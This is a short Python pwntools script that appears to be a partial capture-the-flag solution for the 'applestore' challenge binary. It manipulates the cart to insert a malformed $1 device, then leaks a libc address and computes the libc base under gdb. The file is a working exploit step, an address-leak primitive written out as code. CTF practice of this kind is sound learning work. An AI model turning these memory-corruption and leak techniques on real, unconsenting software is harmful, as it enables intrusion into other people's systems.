from pwn import *


class Prompts:
    CHOICE = '> '
    DEV_NUM = 'Device Number> '
    CART_CHECK = 'Let me check your cart. ok? (y/n) > '


class Choices:
    ADD = '2'
    LIST_CART = '4'
    CHECKOUT = '5'
    OK = 'y'


applestore = ELF('applestore')
libc = ELF('libc_32.so.6')

p = gdb.debug(
    applestore.path,
    '''
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def leak_libc():
    print('[*] Leaking the address of libc.')
    p.sendafter(Prompts.CHOICE, Choices.LIST_CART)
    p.sendafter(Prompts.CART_CHECK, Choices.OK)
    p.recvn(0x257)
    libc_addr = p.recv()[:-1]
    libc_base_addr = (int(libc_addr) & 0xffffffff) - 0x2d060
    print(f'[*] libc base address: {hex(libc_base_addr)}')
    return libc_base_addr


def add_devices():
    devices = {3: 3,  2: 11, 1: 12}
    print('[*] Adding devices to get a 1$ device which isn\'t inserted into  the device list correctly.')
    for dev_index, add_count in devices.items():
        for _ in range(add_count):
            p.sendafter(Prompts.CHOICE, Choices.ADD)
            p.sendafter(Prompts.DEV_NUM, str(dev_index))


def insert_malformed_device():
    p.sendafter(Prompts.CHOICE, Choices.CHECKOUT)
    p.sendafter(Prompts.CART_CHECK, Choices.OK)


def main():
    add_devices()
    insert_malformed_device()
    leak_libc()


if __name__ == "__main__":
    main()
